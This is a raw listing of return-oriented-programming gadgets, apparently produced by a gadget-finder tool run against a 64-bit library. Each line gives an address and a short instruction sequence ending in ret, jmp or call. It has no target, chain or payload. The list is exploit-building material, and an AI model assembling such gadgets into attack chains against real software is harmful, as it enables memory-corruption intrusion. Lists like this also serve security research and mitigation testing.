0x00002aaaaac80ac3 : add byte ptr [rbx + rcx - 0x7847ffff], cl ; call qword ptr [rsi]
0x00002aaaaabe8e5a : add byte ptr [rbx + rcx - 0xd], dh ; ret
0x00002aaaaac74abb : add byte ptr [rbx + rcx*2 + 0x32400000], al ; jmp 0x19facb
0x00002aaaaac84ae3 : add byte ptr [rbx + rcx*2 + 0x6c080001], ch ; cmc ; jmp qword ptr [rcx]
0x00002aaaaab1f007 : add byte ptr [rbx + rcx*4 + 0x57], cl ; or byte ptr [rcx + 0x29], cl ; ret 0x894c
0x00002aaaaab1d427 : add byte ptr [rbx + rcx*4 + 0x57], cl ; or byte ptr [rcx + 1], cl ; ret 0x894c
0x00002aaaaab05419 : add byte ptr [rbx + rcx*4 + 5], al ; jae 0xffffffff894b0466 ; ret
0x00002aaaaac7ca4b : add byte ptr [rbx + rcx*8], dl ; add byte ptr [rax], al ; add byte ptr [rbp - 0x10], dl ; call qword ptr [rax]
0x00002aaaaac6f3c7 : add byte ptr [rbx + rdi*8 - 7], dl ; jmp rsp
0x00002aaaaac6c6c7 : add byte ptr [rbx + rdi*8], dh ; out dx, eax ; call rsp
0x00002aaaaac812c3 : add byte ptr [rbx + rdx - 0x24f7ffff], cl ; call qword ptr [rdi]
0x00002aaaaac6f6df : add byte ptr [rbx + rdx*2 - 6], al ; call rsp
0x00002aaaaac8124b : add byte ptr [rbx + rdx], dl ; add dword ptr [rax], eax ; sbb dl, 0xf3 ; jmp qword ptr [rcx]
0x00002aaaaab42b92 : add byte ptr [rbx + rsi + 0x48], dh ; mov eax, ebp ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac832cb : add byte ptr [rbx + rsi - 0x16ffffff], dl ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac6fcc7 : add byte ptr [rbx + rsi*2], dh ; sti ; call rsp
0x00002aaaaac8f2b3 : add byte ptr [rbx + rsi*8 + 1], bh ; add byte ptr [rax + 0x16], bl ; clc ; jmp qword ptr [rcx]
0x00002aaaaac8f26b : add byte ptr [rbx + rsi*8], dh ; add dword ptr [rax], eax ; add byte ptr [rsi], dl ; clc ; call qword ptr [rdx]
0x00002aaaaab2f37e : add byte ptr [rbx - 0x109743], al ; call qword ptr [rax]
0x00002aaaaac102cf : add byte ptr [rbx - 0x2ec6d7b1], cl ; jae 0x13b2ea ; xor eax, eax ; ret
0x00002aaaaac102ce : add byte ptr [rbx - 0x2ec6d7b1], cl ; jae 0x13b2eb ; xor eax, eax ; ret
0x00002aaaaac1030f : add byte ptr [rbx - 0x2ec6d7b1], cl ; jae 0x13b32a ; xor eax, eax ; ret
0x00002aaaaac1030e : add byte ptr [rbx - 0x2ec6d7b1], cl ; jae 0x13b32b ; xor eax, eax ; ret
0x00002aaaaaba1647 : add byte ptr [rbx - 0x2f76ff06], al ; jle 0xcc661 ; ret
0x00002aaaaab4962f : add byte ptr [rbx - 0x3b7cb7fe], cl ; sbb byte ptr [rbx + 0x5d], bl ; ret
0x00002aaaaab7f10f : add byte ptr [rbx - 0x3d], bl ; mov eax, 0x10 ; pop rbx ; ret
0x00002aaaaab7f108 : add byte ptr [rbx - 0x3d], bl ; mov eax, 0x20 ; pop rbx ; ret
0x00002aaaaab7f101 : add byte ptr [rbx - 0x3d], bl ; mov eax, 0x30 ; pop rbx ; ret
0x00002aaaaab7f0fa : add byte ptr [rbx - 0x3d], bl ; mov eax, 0x40 ; pop rbx ; ret
0x00002aaaaab7f0f3 : add byte ptr [rbx - 0x3d], bl ; mov eax, 0x60 ; pop rbx ; ret
0x00002aaaaab7f0ec : add byte ptr [rbx - 0x3d], bl ; mov eax, 0x80 ; pop rbx ; ret
0x00002aaaaabda3db : add byte ptr [rbx - 0x3f7ac7c0], cl ; cmove eax, edx ; ret
0x00002aaaaabfcb86 : add byte ptr [rbx - 0x3f7ae7c0], cl ; jne 0x127b98 ; ret
0x00002aaaaabe959f : add byte ptr [rbx - 0x3f7aefb9], cl ; jne 0x1145b9 ; ret
0x00002aaaaac1059f : add byte ptr [rbx - 0x47fbd7b9], al ; add dword ptr [rax], eax ; add byte ptr [rax], al ; ret
0x00002aaaaac09d4f : add byte ptr [rbx - 0x47fd76f9], cl ; add dword ptr [rax], eax ; add byte ptr [rax], al ; ret
0x00002aaaaac067cf : add byte ptr [rbx - 0x47fd76ff], cl ; add dword ptr [rax], eax ; add byte ptr [rax], al ; ret
0x00002aaaaabde83b : add byte ptr [rbx - 0x48f0f440], al ; ror byte ptr [rax - 0x75], 0x54 ; ret 0x8940
0x00002aaaaabdecfb : add byte ptr [rbx - 0x48f0f540], al ; ror byte ptr [rax - 0x75], 0x54 ; ret 0x8940
0x00002aaaaabde9fb : add byte ptr [rbx - 0x48f0f640], al ; ror byte ptr [rax - 0x75], 0x54 ; ret 0x8940
0x00002aaaaabde96b : add byte ptr [rbx - 0x48f0f740], al ; ror byte ptr [rax - 0x75], 0x54 ; ret 0x8940
0x00002aaaaabdebbb : add byte ptr [rbx - 0x48f0f840], al ; ror byte ptr [rax - 0x75], 0x54 ; ret 0x8940
0x00002aaaaabdec5b : add byte ptr [rbx - 0x48f0f940], al ; ror byte ptr [rax - 0x75], 0x54 ; ret 0x8940
0x00002aaaaabded8b : add byte ptr [rbx - 0x48f0fa40], al ; ror byte ptr [rax - 0x75], 0x54 ; ret 0x8940
0x00002aaaaabdeebb : add byte ptr [rbx - 0x48f0fb40], al ; ror byte ptr [rax - 0x75], 0x54 ; ret 0x8940
0x00002aaaaabdea8b : add byte ptr [rbx - 0x48f0fc40], al ; ror byte ptr [rax - 0x75], 0x54 ; ret 0x8940
0x00002aaaaabde8cb : add byte ptr [rbx - 0x48f0fd40], al ; ror byte ptr [rax - 0x75], 0x54 ; ret 0x8940
0x00002aaaaabdeb1b : add byte ptr [rbx - 0x48f0fe40], al ; ror byte ptr [rax - 0x75], 0x54 ; ret 0x8940
0x00002aaaaab2c21e : add byte ptr [rbx - 0x4e343], al ; call qword ptr [rax]
0x00002aaaaab7ee49 : add byte ptr [rbx - 0x50f0fe40], al ; ret 0x74e9
0x00002aaaaab7ee34 : add byte ptr [rbx - 0x50f0fe40], al ; ret 0xaf0f
0x00002aaaaac822f3 : add byte ptr [rbx - 0x64d7ffff], bh ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac822db : add byte ptr [rbx - 0x64efffff], ah ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac822c3 : add byte ptr [rbx - 0x6507ffff], cl ; hlt ; jmp qword ptr [rcx]
0x00002aaaaab0270b : add byte ptr [rbx - 0x72b7f205], al ; push rax ; add dword ptr [rcx + rdi - 0x7d], esi ; ret
0x00002aaaaab0f724 : add byte ptr [rbx - 0x75], bl ; pop rax ; ret
0x00002aaaaabe3abd : add byte ptr [rbx - 0x76b3fe18], al ; ret 0x2b49
0x00002aaaaab8deeb : add byte ptr [rbx - 0x76b6f020], al ; ret
0x00002aaaaab8dac1 : add byte ptr [rbx - 0x76b6f020], al ; ret 0xc149
0x00002aaaaab00769 : add byte ptr [rbx - 0x76be0008], al ; ret
0x00002aaaaab47a1f : add byte ptr [rbx - 0x76be69c4], cl ; jl 0x729c7 ; add byte ptr [rax - 0x7d], cl ; ret 0x4c01
0x00002aaaaabbba25 : add byte ptr [rbx - 0x76f72cac], cl ; push rsp ; ret
0x00002aaaaabbc6f1 : add byte ptr [rbx - 0x77], bl ; rcr byte ptr [rbp + 0x41], 1 ; pop rsp ; pop r13 ; pop r14 ; ret
0x00002aaaaab1ca10 : add byte ptr [rbx - 0x77], bl ; rcr byte ptr [rbp + 0x41], 1 ; pop rsp ; ret
0x00002aaaaaaf576f : add byte ptr [rbx - 0x7a2dcf00], cl ; ror byte ptr [rdi], 0x94 ; ret 0x8d48
0x00002aaaaab2cd38 : add byte ptr [rbx - 0x7af00008], al ; ret
0x00002aaaaabb581f : add byte ptr [rbx - 0x7af0f71a], al ; ret
0x00002aaaaab48e94 : add byte ptr [rbx - 0x7af0fd03], al ; ret 0
0x00002aaaaabb09f7 : add byte ptr [rbx - 0x7af7db8c], cl ; div byte ptr [rax - 0xa] ; ret
0x00002aaaaac46356 : add byte ptr [rbx - 0x7bf0ed07], al ; ret 2
0x00002aaaaab41e34 : add byte ptr [rbx - 0x7bf0fd1e], al ; ret 1
0x00002aaaaac10a1f : add byte ptr [rbx - 0x7cb703b6], cl ; ret 0x4808
0x00002aaaaaba5c37 : add byte ptr [rbx - 0x7cb7f3b5], cl ; ret
0x00002aaaaabab187 : add byte ptr [rbx - 0x7cb7fe3b], al ; ret
0x00002aaaaabb5c0f : add byte ptr [rbx - 0x7cb7fe3f], al ; ret 0x4404
0x00002aaaaabac660 : add byte ptr [rbx - 0x7cb7fe40], al ; ret 0x3d01
0x00002aaaaabbdbdf : add byte ptr [rbx - 0x7cb7fe40], al ; ret 0x4108
0x00002aaaaabd5e4f : add byte ptr [rbx - 0x7d], dl ; call qword ptr [rcx]
0x00002aaaaabe9f7f : add byte ptr [rbx - 0xd8a0008], al ; xor eax, eax ; leave ; ret
0x00002aaaaab47fd6 : add byte ptr [rbx - 0xd], bl ; ret
0x00002aaaaabf99d4 : add byte ptr [rbx], 0 ; add byte ptr [rcx], bh ; ret
0x00002aaaaabd2162 : add byte ptr [rbx], al ; push rsp ; and al, 0x38 ; mov eax, edx ; add rsp, 0x48 ; ret
0x00002aaaaac91603 : add byte ptr [rbx], bh ; add eax, 0x1e70000 ; add byte ptr [rax], al ; ret 4
0x00002aaaaab01b26 : add byte ptr [rbx], bh ; jp 0x2cb6d ; jae 0x2cb4a ; mov rax, qword ptr [rdx + rdi*8 + 0x40] ; ret
0x00002aaaaac69a58 : add byte ptr [rbx], ch ; cld ; jmp rax
0x00002aaaaac7c170 : add byte ptr [rbx], ch ; cli ; call qword ptr [rdi]
0x00002aaaaab8fc59 : add byte ptr [rbx], cl ; add byte ptr [rax], al ; xor eax, eax ; add rsp, 8 ; ret
0x00002aaaaac6e4d7 : add byte ptr [rbx], dh ; idiv edi ; ret 1
0x00002aaaaaba2128 : add byte ptr [rcx + 0x146348f6], cl ; mov al, 0x48 ; add eax, edx ; jmp rax
0x00002aaaaab2a766 : add byte ptr [rcx + 0x1b802], cl ; add byte ptr [rax], al ; ret
0x00002aaaaab89bc8 : add byte ptr [rcx + 0x29], al ; ret 0x8341
0x00002aaaaab012bf : add byte ptr [rcx + 0x29], cl ; ror dword ptr [rcx + 1], 1 ; ret 0x854d
0x00002aaaaab91ba8 : add byte ptr [rcx + 0x308f090d], cl ; add byte ptr [rcx + 1], cl ; ret
0x00002aaaaab9971f : add byte ptr [rcx + 0x346348d6], cl ; mov al, 0x48 ; add eax, esi ; jmp rax
0x00002aaaaac066f3 : add byte ptr [rcx + 0x346348f6], cl ; mov al, 0x48 ; add eax, esi ; jmp rax
0x00002aaaaac3d0ff : add byte ptr [rcx + 0x3518911], cl ; ret
0x00002aaaaabe4fef : add byte ptr [rcx + 0x39], al ; ror byte ptr [rdi], 0x84 ; sbb eax, 0x89000001 ; ret 0x8944
0x00002aaaaab5fe7f : add byte ptr [rcx + 0x39], cl ; ret
0x00002aaaaac03f5b : add byte ptr [rcx + 0x39], cl ; ret 0x850f
0x00002aaaaab11e6a : add byte ptr [rcx + 0x39], cl ; ret 0x87e
0x00002aaaaab1b078 : add byte ptr [rcx + 0x39], cl ; ret 0xea75
0x00002aaaaab63976 : add byte ptr [rcx + 0x39], cl ; ror byte ptr [rdi + rcx + 0x47], 1 ; ret 0x894c
0x00002aaaaab30773 : add byte ptr [rcx + 0x415d5bc8], cl ; pop rsp ; pop r13 ; ret
0x00002aaaaab9e07a : add byte ptr [rcx + 0x415d5bd0], cl ; pop rsp ; pop r13 ; pop r14 ; ret
0x00002aaaaabcb8be : add byte ptr [rcx + 0x415d5bd8], cl ; pop rsp ; pop r13 ; ret
0x00002aaaaab447d9 : add byte ptr [rcx + 0x415d5bd8], cl ; pop rsp ; ret
0x00002aaaaac14cb8 : add byte ptr [rcx + 0x415d5be8], cl ; pop rsp ; pop r13 ; pop r14 ; ret
0x00002aaaaab451e2 : add byte ptr [rcx + 0x415d5be8], cl ; pop rsp ; pop r13 ; ret
0x00002aaaaabeae20 : add byte ptr [rcx + 0x415d5bf0], cl ; pop rsp ; ret
0x00002aaaaab72e4f : add byte ptr [rcx + 0x447c60f], cl ; add byte ptr [rax - 0x77], cl ; clc ; ret
0x00002aaaaac3d0df : add byte ptr [rcx + 0x4518811], cl ; ret
0x00002aaaaab7b18f : add byte ptr [rcx + 0x4578817], cl ; ret
0x00002aaaaab72e9f : add byte ptr [rcx + 0x4789440f], cl ; add al, 0x48 ; lea eax, dword ptr [rdi + 7] ; ret
0x00002aaaaab72dff : add byte ptr [rcx + 0x4789440f], cl ; add al, 0x48 ; mov eax, edi ; ret
0x00002aaaaab50a06 : add byte ptr [rcx + 0x48d231d1], cl ; mov eax, dword ptr [rax + 0x48] ; jmp rax
0x00002aaaaaad544c : add byte ptr [rcx + 0x5000c81], cl ; jl 0x46e ; sbb al, 0xc ; ret 0x4412
0x00002aaaaab72eef : add byte ptr [rcx + 0x5789660f], cl ; add al, 0x48 ; lea eax, dword ptr [rdi + 5] ; ret
0x00002aaaaab72def : add byte ptr [rcx + 0x5789660f], cl ; add al, 0x48 ; mov eax, edi ; ret
0x00002aaaaabbeab6 : add byte ptr [rcx + 0x5b595a0a], cl ; ret
0x00002aaaaabd634a : add byte ptr [rcx + 0x5b], bl ; pop rbp ; pop r12 ; ret
0x00002aaaaab4a512 : add byte ptr [rcx + 0x5bd089c2], cl ; ret
0x00002aaaaab47b7c : add byte ptr [rcx + 0x5d5b7453], cl ; pop r12 ; ret
0x00002aaaaac254fe : add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaab72d16 : add byte ptr [rcx + 0x63], cl ; add al, 0x82 ; add r10, rax ; jmp r10
0x00002aaaaab1cc90 : add byte ptr [rcx + 0x63], cl ; or al, 0x8b ; add rcx, r11 ; jmp rcx
0x00002aaaaac4285c : add byte ptr [rcx + 0x63], cl ; or al, 0x93 ; add rcx, r11 ; jmp rcx
0x00002aaaaab7a038 : add byte ptr [rcx + 0x63], cl ; or al, 0x93 ; lea rcx, qword ptr [r11 + rcx] ; jmp rcx
0x00002aaaaac6a28c : add byte ptr [rcx + 0x7720fffc], 0xfc ; jmp rax
0x00002aaaaab02f1f : add byte ptr [rcx + 0x7fe083f8], cl ; ret
0x00002aaaaab09c57 : add byte ptr [rcx + 0x7fffff], ch ; je 0x34c52 ; ret
0x00002aaaaabd3f3f : add byte ptr [rcx + 0x800008], al ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaac09cb3 : add byte ptr [rcx + 0xc6348f6], cl ; mov al, 0x48 ; add eax, ecx ; jmp rax
0x00002aaaaab00e40 : add byte ptr [rcx + 0xc6349d9], cl ; mov byte ptr [rcx + rax - 0x3f], cl ; jmp rcx
0x00002aaaaab98de2 : add byte ptr [rcx + 0xf], al ; fiadd word ptr [r9] ; ret
0x00002aaaaabd72b5 : add byte ptr [rcx + 0xf], al ; lahf ; ret
0x00002aaaaabb7eb7 : add byte ptr [rcx + 0xf], al ; mov dh, 0x34 ; adc cl, byte ptr [rax - 0x7d] ; ret 0x4001
0x00002aaaaaba8a18 : add byte ptr [rcx + 0xf], al ; mov dh, 0x55 ; add byte ptr [rcx], bh ; ret 0x840f
0x00002aaaaab2b804 : add byte ptr [rcx + 0xf], al ; mov dh, 0x56 ; or al, 0x83 ; ret
0x00002aaaaab2b787 : add byte ptr [rcx + 0xf], al ; mov dh, 0x56 ; or al, 0xf6 ; ret 0xf08
0x00002aaaaab3359b : add byte ptr [rcx + 0xf], al ; mov dh, 0x75 ; add byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaab559a4 : add byte ptr [rcx + 0xf], al ; xchg eax, ebp ; ret
0x00002aaaaab0b2c9 : add byte ptr [rcx + 0xf], al ; xchg eax, esi ; ret 0x394c
0x00002aaaaab7ed52 : add byte ptr [rcx + 0xf], al ; xchg eax, esp ; ret
0x00002aaaaab22c20 : add byte ptr [rcx + 0xf], cl ; ret
0x00002aaaaabb9027 : add byte ptr [rcx + 1], al ; ret
0x00002aaaaab7e7df : add byte ptr [rcx + 1], cl ; ret
0x00002aaaaaad5881 : add byte ptr [rcx + 4], cl ; or al, 1 ; add byte ptr [rax], al ; ret 0x440c
0x00002aaaaac91133 : add byte ptr [rcx + 6], dl ; add byte ptr [rax], al ; ret 2
0x00002aaaaab59998 : add byte ptr [rcx + rax - 0x18], cl ; jmp rax
0x00002aaaaac6c55f : add byte ptr [rcx + rax*4], dh ; out dx, eax ; jmp rsp
0x00002aaaaac6dccf : add byte ptr [rcx + rax*8 - 0x6903000a], dh ; add dword ptr [rax], eax ; ret 0xfff6
0x00002aaaaac6fa4f : add byte ptr [rcx + rax*8 - 6], dh ; jmp qword ptr [rdi + rdx*2 + 2]
0x00002aaaaac7c07b : add byte ptr [rcx + rax*8], al ; add al, dl ; jrcxz 0x1a707a ; call rsp
0x00002aaaaac70063 : add byte ptr [rcx + rax], ch ; add byte ptr [rax], al ; call 0x111998cd
0x00002aaaaac6eaaf : add byte ptr [rcx + rbp*2], dh ; clc ; call rsp
0x00002aaaaac7688b : add byte ptr [rcx + rbp*2], dl ; add byte ptr [rax], ah ; add ebp, ebp ; call qword ptr [rsi]
0x00002aaaaac8a8a3 : add byte ptr [rcx + rbp*4 + 1], ch ; add byte ptr [rax], cl ; loop 0x1b58ae ; call rsi
0x00002aaaaac7a87b : add byte ptr [rcx + rbp*4], al ; add byte ptr [rax], ah ; out dx, al ; call qword ptr [rdx]
0x00002aaaaac7a843 : add byte ptr [rcx + rbp*4], cl ; add byte ptr [rax], al ; mov byte ptr [rsi - 0x12], cl ; jmp qword ptr [rdx]
0x00002aaaaac6f557 : add byte ptr [rcx + rbp], dl ; cli ; jmp rsp
0x00002aaaaac6f477 : add byte ptr [rcx + rbx - 6], dh ; jmp rsp
0x00002aaaaac6b8b7 : add byte ptr [rcx + rbx*2 - 0x13], al ; jmp rsp
0x00002aaaaac6b43f : add byte ptr [rcx + rbx*2 - 0x16], ah ; call rsp
0x00002aaaaac6eccf : add byte ptr [rcx + rbx*8 - 8], al ; call rsp
0x00002aaaaac7d86b : add byte ptr [rcx + rbx*8], dh ; add byte ptr [rax], al ; and dword ptr [rdi], ebp ; int1 ; jmp qword ptr [rax]
0x00002aaaaab45fec : add byte ptr [rcx + rcx + 0x44], dh ; mov eax, eax ; pop rbx ; ret
0x00002aaaaabe24b4 : add byte ptr [rcx + rcx + 0x5b], dh ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaac6e9e7 : add byte ptr [rcx + rcx*2 - 8], dl ; jmp rsp
0x00002aaaaac0c7e1 : add byte ptr [rcx + rcx*4 + 0x24], cl ; ret 0x8e0f
0x00002aaaaab9e221 : add byte ptr [rcx + rcx*4 + 0x32], ah ; add rsp, 0x18 ; ret
0x00002aaaaab9e2eb : add byte ptr [rcx + rcx*4 + 0x32], ah ; add rsp, 8 ; ret
0x00002aaaaabb8ba3 : add byte ptr [rcx + rcx*4 + 0x34], cl ; ret 0x3944
0x00002aaaaab5602f : add byte ptr [rcx + rcx*4 + 0x44], cl ; and al, 0x10 ; xor edi, edi ; call qword ptr [rax]
0x00002aaaaab6911f : add byte ptr [rcx + rcx*4 + 0x4f], cl ; cmp bl, dh ; ret
0x00002aaaaac00c05 : add byte ptr [rcx + rcx*4 + 0x54], cl ; and al, 0x18 ; lea r9, qword ptr [rsp + 0x2c] ; call qword ptr [rax]
0x00002aaaaabdb820 : add byte ptr [rcx + rcx*4 + 4], ah ; and eax, 0x2d0 ; pop rax ; pop rdi ; call rax
0x00002aaaaab046d7 : add byte ptr [rcx + rcx*4 - 0x11], cl ; call rax
0x00002aaaaabd7b63 : add byte ptr [rcx + rcx*4 - 0x11], cl ; call rbx
0x00002aaaaabd7c97 : add byte ptr [rcx + rcx*4 - 0x19], cl ; call rbx
0x00002aaaaab5d2a4 : add byte ptr [rcx + rcx*4 - 0x19], cl ; mov rdx, r13 ; mov rsi, rbp ; call rax
0x00002aaaaab5d14f : add byte ptr [rcx + rcx*4 - 0x1a], cl ; mov rdi, rbp ; call rax
0x00002aaaaab5c2b1 : add byte ptr [rcx + rcx*4 - 0x1a], cl ; mov rdi, rbx ; call rax
0x00002aaaaab5c041 : add byte ptr [rcx + rcx*4 - 0x1e], cl ; mov rdi, r15 ; call rax
0x00002aaaaabadc2a : add byte ptr [rcx + rcx*4 - 0x3e], cl ; jmp 0xd8c3d
0x00002aaaaab73182 : add byte ptr [rcx + rcx*4 - 0x3f], cl ; mov qword ptr [rdx], rcx ; ret
0x00002aaaaab46036 : add byte ptr [rcx + rcx*4 - 0x40], al ; pop rbx ; ret
0x00002aaaaab52f35 : add byte ptr [rcx + rcx*4 - 0x40], cl ; ret
0x00002aaaaabb4b47 : add byte ptr [rcx + rcx*4 - 0x54], al ; and al, 0xa4 ; add byte ptr [rax], al ; add byte ptr [rcx], cl ; ret 0xb60f
0x00002aaaaaaf52f2 : add byte ptr [rcx + rcx*4 - 0xa], al ; call 0xa9eba
0x00002aaaaab996ac : add byte ptr [rcx + rcx*4 - 0xa], al ; movsxd rsi, dword ptr [rdx + rsi*4] ; add rdx, rsi ; jmp rdx
0x00002aaaaab5be23 : add byte ptr [rcx + rcx*4 - 0xa], cl ; call rax
0x00002aaaaabd7acc : add byte ptr [rcx + rcx*4 - 1], cl ; call rbx
0x00002aaaaac0c4ad : add byte ptr [rcx + rcx*4 - 1], cl ; lea r9, qword ptr [rsp + 0x2a] ; call qword ptr [rax]
0x00002aaaaab38b62 : add byte ptr [rcx + rcx*4 - 6], cl ; mov rsi, qword ptr [rip + 0x35f403] ; call rax
0x00002aaaaabf12fd : add byte ptr [rcx + rcx*4 - 6], cl ; mov rsi, r14 ; mov rdi, r13 ; call rax
0x00002aaaaab55f45 : add byte ptr [rcx + rcx*4 - 9], cl ; call qword ptr [rax]
0x00002aaaaabd7adb : add byte ptr [rcx + rcx*4 - 9], cl ; call rbx
0x00002aaaaac00de1 : add byte ptr [rcx + rcx*4 - 9], cl ; lea r9, qword ptr [rsp + 0x1c] ; call qword ptr [rax]
0x00002aaaaac01928 : add byte ptr [rcx + rcx*4 - 9], cl ; mov rcx, qword ptr [rsp + 8] ; call rcx
0x00002aaaaac78843 : add byte ptr [rcx + rcx*4], cl ; add byte ptr [rax], al ; fdivr dword ptr [rcx - 0x13] ; jmp qword ptr [rcx]
0x00002aaaaab583d8 : add byte ptr [rcx + rdi - 0x3e], cl ; jne 0x833a7 ; ret
0x00002aaaaac8384b : add byte ptr [rcx + rdi], dl ; add dword ptr [rax], eax ; adc bh, bh ; hlt ; call rsi
0x00002aaaaab43e74 : add byte ptr [rcx + rdx + 0x48], dh ; mov eax, ebp ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac710cb : add byte ptr [rcx + rdx + 0x71100000], dl ; std ; jmp qword ptr [rdi]
0x00002aaaaac6def7 : add byte ptr [rcx + rdx - 9], dl ; jmp rsp
0x00002aaaaac850c3 : add byte ptr [rcx + rdx*2 + 0x72680001], cl ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac8507b : add byte ptr [rcx + rdx*2 + 1], al ; add byte ptr [rax], ah ; jb 0x1b0080 ; jmp qword ptr [rcx]
0x00002aaaaac850ab : add byte ptr [rcx + rdx*2 + 1], dh ; add byte ptr [rax + 0x72], dl ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac790ab : add byte ptr [rcx + rdx*4], dh ; add byte ptr [rax], al ; nop ; in eax, dx ; call qword ptr [rdx]
0x00002aaaaac6d27f : add byte ptr [rcx + rdx*4], dh ; hlt ; jmp rsp
0x00002aaaaac6f2a7 : add byte ptr [rcx + rdx*8], al ; stc ; call rsp
0x00002aaaaac7d073 : add byte ptr [rcx + rdx*8], bh ; add byte ptr [rax], al ; fdiv st(0) ; call qword ptr [rax]
0x00002aaaaac7107b : add byte ptr [rcx + rdx], al ; add al, ah ; in eax, -0x18 ; call qword ptr [rdx]
0x00002aaaaac8705b : add byte ptr [rcx + rsi*2], ah ; add dword ptr [rax], eax ; and esi, esi ; jmp qword ptr [rsi]
0x00002aaaaac87073 : add byte ptr [rcx + rsi*2], bh ; add dword ptr [rax], eax ; pop rax ; and esi, esi ; jmp qword ptr [rsi]
0x00002aaaaac7708b : add byte ptr [rcx + rsi*2], dl ; add byte ptr [rax], dh ; in eax, dx ; call rdx
0x00002aaaaac7f0db : add byte ptr [rcx + rsi*8 + 0x15700000], ah ; jmp qword ptr [rcx]
0x00002aaaaac6afe7 : add byte ptr [rcx + rsi*8 - 0x17], al ; call rsp
0x00002aaaaac7f06b : add byte ptr [rcx + rsi*8], dh ; add byte ptr [rax], al ; loopne 0x1aa08e ; call qword ptr [rdx]
0x00002aaaaac730b3 : add byte ptr [rcx + rsi], bh ; add al, bh ; ret
0x00002aaaaab5b4a3 : add byte ptr [rcx - 0x173fce16], cl ; ret
0x00002aaaaaad747b : add byte ptr [rcx - 0x23], al ; out 0xa9, al ; ret 0xbd07
0x00002aaaaab93632 : add byte ptr [rcx - 0x39], al ; add al, 0x24 ; add dword ptr [rax], eax ; add byte ptr [rax], al ; jmp 0xbe609
0x00002aaaaab1742b : add byte ptr [rcx - 0x39], cl ; ret 0xc001
0x00002aaaaab144d3 : add byte ptr [rcx - 0x39], cl ; ret 0xfc01
0x00002aaaaab11213 : add byte ptr [rcx - 0x39], cl ; ret 0xff81
0x00002aaaaab81a19 : add byte ptr [rcx - 0x39], cl ; ret 0xffff
0x00002aaaaabd3748 : add byte ptr [rcx - 0x3a], al ; inc dword ptr [rax] ; ret
0x00002aaaaabca38f : add byte ptr [rcx - 0x3fcefb89], cl ; ret
0x00002aaaaab15f7f : add byte ptr [rcx - 0x43], al ; add eax, dword ptr [rax + rax] ; add cl, ch ; ret 0xffec
0x00002aaaaab8709a : add byte ptr [rcx - 0x44], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaab07964 : add byte ptr [rcx - 0x55551e], al ; call rcx
0x00002aaaaaafbe53 : add byte ptr [rcx - 0x73], cl ; add dword ptr [r8 + 0x39], r9d ; ret
0x00002aaaaaafbe70 : add byte ptr [rcx - 0x73], cl ; add r9b, byte ptr [r8 + 0x39] ; ret
0x00002aaaaaafbe8d : add byte ptr [rcx - 0x73], cl ; add r9d, dword ptr [r8 + 0x39] ; ret
0x00002aaaaab33790 : add byte ptr [rcx - 0x73], cl ; dec dword ptr [r8 + 0x39] ; ret
0x00002aaaaabd2e57 : add byte ptr [rcx - 0x73], cl ; push rdi ; add ebx, ebp ; and eax, 0x83489066 ; ret 0x3c01
0x00002aaaaabd75cf : add byte ptr [rcx - 0x75], cl ; adc byte ptr [r8 - 0x7d], r9b ; ret
0x00002aaaaab26fe4 : add byte ptr [rcx - 0x75], cl ; add byte ptr [r8 - 0x7d], r9b ; call 0xffffffffc23e67fc
0x00002aaaaac485df : add byte ptr [rcx - 0x75], cl ; jge 0x17365b ; call 0x1f8af
0x00002aaaaac0cde7 : add byte ptr [rcx - 0x75], cl ; or byte ptr [r8 - 0x77], r9b ; fimul word ptr [rcx + rcx*4 - 1] ; call qword ptr [rax]
0x00002aaaaabc689a : add byte ptr [rcx - 0x75], cl ; push rbp ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaab1af94 : add byte ptr [rcx - 0x75], cl ; ret
0x00002aaaaabed0f7 : add byte ptr [rcx - 0x76f3dba4], cl ; ret 0x6ae9
0x00002aaaaab72e3f : add byte ptr [rcx - 0x776b7f1], cl ; ret
0x00002aaaaaba6623 : add byte ptr [rcx - 0x77], al ; ret
0x00002aaaaabb2214 : add byte ptr [rcx - 0x77], al ; ret 0x3945
0x00002aaaaab1cd69 : add byte ptr [rcx - 0x77], al ; ret 0xc083
0x00002aaaaabb21c9 : add byte ptr [rcx - 0x77], al ; ret 0xc141
0x00002aaaaaba3958 : add byte ptr [rcx - 0x77], cl ; cld ; je 0xce97b ; call 0x8ab78
0x00002aaaaab528a6 : add byte ptr [rcx - 0x77], cl ; hlt ; xor edi, edi ; mov r13, rdx ; call qword ptr [r15]
0x00002aaaaab2e781 : add byte ptr [rcx - 0x77], cl ; ret
0x00002aaaaab3b2b7 : add byte ptr [rcx - 0x77], cl ; ret 0x34c
0x00002aaaaab56317 : add byte ptr [rcx - 0x77], cl ; ret 0x854d
0x00002aaaaab2fef6 : add byte ptr [rcx - 0x77], cl ; ret 0x8b4c
0x00002aaaaabedcab : add byte ptr [rcx - 0x77], cl ; ror byte ptr [rdi], 0x85 ; ret 0xfffe
0x00002aaaaab44777 : add byte ptr [rcx - 0x77], dh ; fcomp dword ptr [rbx + 0x5d] ; pop r12 ; ret
0x00002aaaaab31890 : add byte ptr [rcx - 0x7afcb730], cl ; push -0x7c000006 ; ret 0x8908
0x00002aaaaab49f13 : add byte ptr [rcx - 0x7cb768f4], cl ; ret 0x4801
0x00002aaaaabb7706 : add byte ptr [rcx - 0x7d], al ; cld ; dec dword ptr [rdi] ; xchg eax, esp ; ret 0xb60f
0x00002aaaaab39326 : add byte ptr [rcx - 0x7d], al ; in al, dx ; add dword ptr [rax + 1], ecx ; ret
0x00002aaaaab8a066 : add byte ptr [rcx - 0x7d], al ; ret
0x00002aaaaaba5f17 : add byte ptr [rcx - 0x7d], al ; ret 0x4901
0x00002aaaaab2633e : add byte ptr [rcx - 0x7d], al ; std ; xor byte ptr [rdi], cl ; xchg eax, esp ; ret
